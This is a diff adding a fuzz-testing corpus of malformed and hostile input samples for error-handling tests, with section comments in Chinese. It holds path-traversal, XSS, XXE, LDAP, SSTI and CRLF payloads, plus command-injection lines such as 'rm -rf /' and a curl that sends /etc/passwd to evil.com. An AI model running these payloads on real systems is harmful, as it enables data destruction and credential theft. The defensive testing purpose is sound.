@@ -1,0 +1,120 @@
+# KADD FUZZ测试语料库 - 畸形输入样本
+#
+# 此文件包含格式错误和异常输入，用于测试错误处理能力
+
+# ========== 空字符和二进制 ==========
+\x00
+\x00\x00\x00\x00
+\xff\xff\xff\xff
+\x00SELECT\x00*\x00FROM\x00users
+\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10
+\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f
+
+# ========== 重复引号 ==========
+''''''''''''''''''''
+"""""""""""""""""""""
+'"
+"'
+'''"""'''
+\'\"\\
+
+# ========== 重复特殊字符 ==========
+\\\\\\\\\\\\\
+))))))))))))
+((((((((((((
+{{{{{{{{{{{{
+}}}}}}}}}}}
+[[[[[[[[[[
+]]]]]]]]]]
+??????????
+
+# ========== 路径穿越 (Path Traversal) ==========
+../../etc/passwd
+../../../etc/passwd
+../../../../etc/shadow
+..\..\..\windows\system32
+..\\..\\..\\windows\\win.ini
+....//....//....//etc/passwd
+..%2f..%2f..%2fetc%2fpasswd
+%2e%2e%2f%2e%2e%2fetc%2fpasswd
+/../../../etc/hosts
+..\..\..\..\boot.ini
+../../proc/self/environ
+../../var/log/apache2/access.log
+
+# ========== 格式化字符串 (Format String) ==========
+%s%s%s%s%s%s%s%s%s%s
+%x%x%x%x%x%x%x%x%x%x
+%n%n%n%n%n
+%d%d%d%d%d%d%d%d%d%d
+%p%p%p%p%p%p%p%p%p%p
+%9999999s
+%.999999d
+%1$s%2$s%3$s
+%*999999s
+%1000$x
+
+# ========== 命令注入 (Command Injection) ==========
+; ls -la
+; rm -rf /
+| cat /etc/passwd
+|| ping -c 10 127.0.0.1
+$(whoami)
+`id`
+; cat /etc/shadow;
+& whoami &
+| dir C:\
+$(curl evil.com/$(cat /etc/passwd))
+`wget http://evil.com/shell.sh`
+
+# ========== XSS/HTML 注入 ==========
+<script>alert(1)</script>
+<img src=x onerror=alert(1)>
+<svg onload=alert(1)>
+javascript:alert(1)
+"><script>alert(1)</script>
+'><img src=x onerror=alert(1)>
+<iframe src=javascript:alert(1)>
+<body onload=alert(1)>
+<scr<script>ipt>alert(1)</scr</script>ipt>
+%3Cscript%3Ealert(1)%3C/script%3E
+&#x3C;script&#x3E;alert(1)&#x3C;/script&#x3E;
+data:text/html,<script>alert(1)</script>
+
+# ========== LDAP 注入 ==========
+*)(uid=*))(|(uid=*
+*)(|(password=*)
+*))(|(cn=*
+admin*)((|userPassword=*)
+*))%00
+
+# ========== XXE / XML 注入 ==========
+<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>
+<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/hosts">]><foo>&xxe;</foo>
+<foo xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include href="file:///etc/passwd"/></foo>
+
+# ========== SSTI (Server-Side Template Injection) ==========
+{{7*7}}
+${7*7}
+<%= 7*7 %>
+#{7*7}
+{{config.items()}}
+${applicationScope}
+
+# ========== CRLF 注入 ==========
+\r\nSet-Cookie: session=hijacked
+%0d%0aContent-Length: 0
+\r\n\r\nInjected Header: value
+%0d%0a%0d%0a<script>alert(1)</script>
+
+# ========== 混合编码混淆 ==========
+%%32%25
+\\u0027
+\x27\x20\x4f\x52\x20\x31\x3d\x31
+eval(base64_decode("c3lzdGVtKCdpZCcp"))
+eval(String.fromCharCode(115,121,115,116,101,109,40,39,105,100,39,41))
+
+# ========== 极端长度 / 边界 ==========
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA%00
+A
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\x00BBBBBBBBBBB
